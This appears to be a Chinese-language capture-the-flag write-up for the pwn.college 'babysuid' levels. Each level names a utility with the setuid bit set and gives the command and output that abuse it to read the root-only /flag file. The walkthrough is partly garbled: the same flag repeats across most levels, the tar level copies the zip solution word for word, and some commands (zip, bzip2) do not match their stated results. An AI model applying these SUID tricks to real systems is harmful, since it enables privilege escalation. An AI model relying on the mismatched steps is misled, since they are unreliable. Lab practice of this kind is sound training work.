


## Challenges

### 如何开始做题
```sh
/challenge/babysuid_level1
```
### 解题思路
根据这个章节的名字可知：程序的错误使用，某个可执行程序（通常为系统中常见的程序）被设置了suid位，设置了suid位的程序能够以该程序所有者的权限执行程序，因此如果程序所有者为root则能够以root权限执行，可完成提权，读取root文件等操作


### babysuid-level1
`/usr/bin/cat`被设置suid
```sh
cat /flag
# pwn.college{IIrsGeCfQOMDxkMJjv325KWhdRR.QXzQTMsQDMyMzW}
```
### babysuid-level2
`/usr/bin/more`被设置suid
```sh
more /flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level3
`/usr/bin/less`被设置suid
```sh
less /flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```
### babysuid-level4
`/usr/bin/tail`被设置suid
```sh
tail /flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```
### babysuid-level5
`/usr/bin/head`被设置suid
```sh
head /flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level6
`/usr/bin/sort`被设置suid
```sh
sort /flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level7
`/usr/bin/vim`被设置suid
```sh
vim /flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level8
`/usr/bin/emacs`被设置suid
```sh
emacs /flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level9
`/usr/bin/nano`被设置suid
```sh
nano /flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level10
`/usr/bin/rev`被设置suid
```sh
rev /flag | rev
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level11
`/usr/bin/od`被设置suid

打印八进制数，需要
```sh
od /flag

0000000  30576  11886  28515  27756  26469  31589  28267  27719
0000020  22099  21361  24936  29287  27467  13363  27714  25929
0000040  25680  20022  26188  11861  22609  21882  19796  20851
0000060  19780  19833  22394   2685
0000070
```
打印字符，是否可以写入文件
```sh
od /flag -c
0000000   p   w   n   .   c   o   l   l   e   g   e   {   k   n   G   l
0000020   S   V   q   S   h   a   g   r   K   k   3   4   B   l   I   e
0000040   P   d   6   N   L   f   U   .   Q   X   z   U   T   M   s   Q
0000060   D   M   y   M   z   W   }  \n
0000070
```

### babysuid-level12
`/usr/bin/hd`被设置suid
```sh
hd /flag 
00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 6b 56 69 61  |pwn.college{kVia|
00000010  44 61 51 41 57 51 70 62  66 51 68 6e 66 47 6e 77  |DaQAWQpbfQhnfGnw|
00000020  64 47 30 75 73 4a 67 2e  51 58 30 55 54 4d 73 51  |dG0usJg.QX0UTMsQ|
00000030  44 4d 79 4d 7a 57 7d 0a                           |DMyMzW}.|
00000038
```

### babysuid-level13
`/usr/bin/xxd`被设置suid
```sh
xxd /flag 
00000000: 7077 6e2e 636f 6c6c 6567 657b 5144 5548  pwn.college{QDUH
00000010: 6f31 6970 7761 6f7a 2d71 5730 3461 5133  o1ipwaoz-qW04aQ3
00000020: 6844 466a 795a 6c2e 5158 3155 544d 7351  hDFjyZl.QX1UTMsQ
00000030: 444d 794d 7a57 7d0a                      DMyMzW}.
```


### babysuid-level14
`/usr/bin/base32 `被设置suid
```sh
base32 /flag | base32 -d
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level15
`/usr/bin/base64 `被设置suid
```sh
base64 /flag | base64 -d
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level16
`/usr/bin/split `被设置suid
`split`可将文件分割，默认分割名字前缀为`x`则分割后文件名为`xaa xab`
```sh
split /flag 
cat /xaa
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level17
`/usr/bin/gzip `
```sh
gzip /flag
# flag.gz 仍是root只可读
gzip /flag.gz -d -c
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```


### babysuid-level18
`/usr/bin/bzip2 `
```sh
bzip2 -z /flag
# flag.bz2 仍是root只可读
bzip2 -d -c /flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```

### babysuid-level19
`/usr/bin/zip `是否改成其他用户可读
```sh
zip z /flag.zip
#-rw-r--r-- 1 root hacker 214 Nov  9 00:16 /z.zip
# z.zip hacker可读
unzip /z.zip
# 将z.zip解压到hacker目录，其中的文件flag hacker可读
#r-------- 1 hacker hacker 56 Nov  9 00:08 flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```


### babysuid-level20
`/usr/bin/tar `是否改成其他用户可读
```sh
zip z /flag.zip
#-rw-r--r-- 1 root hacker 214 Nov  9 00:16 /z.zip
# z.zip hacker可读
unzip /z.zip
# 将z.zip解压到hacker目录，其中的文件flag hacker可读
#r-------- 1 hacker hacker 56 Nov  9 00:08 flag
# pwn.college{o5x4cvHAO69UaaXWS48P_uWzcN1.QX0QTMsQDMyMzW}
```